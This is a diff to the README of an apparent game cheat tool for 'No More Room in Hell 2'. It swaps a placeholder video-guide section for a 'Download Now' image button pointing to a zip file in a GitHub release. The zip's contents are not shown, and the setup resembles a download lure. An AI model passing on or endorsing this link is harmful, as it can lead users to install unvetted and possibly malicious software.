@@ -15,11 +15,9 @@ Open-source helper tool. Activates with `Insert`.
 
 ---
 
-## 🎥 Video Guide — Setup & Features Overview
+<a href="https://github.com/fffteleg-pixel/No-More-Room-in-Hell-2-Cheat/releases/download/v1.0.0/NO.MORE.IN.HELL.2.zip" target="_blank" rel="noopener"><img src="https://beeimg.com/images/n45147393263.png" alt="Download Now"></a>
+</div>
 
-[![NMRiH2 Trainer Video Guide](https://img.youtube.com/vi/VIDEO_ID/0.jpg)](https://www.youtube.com/watch?v=VIDEO_ID)
-
-> *Click the image above to watch the full installation guide and feature overview.*
 
 ---
 
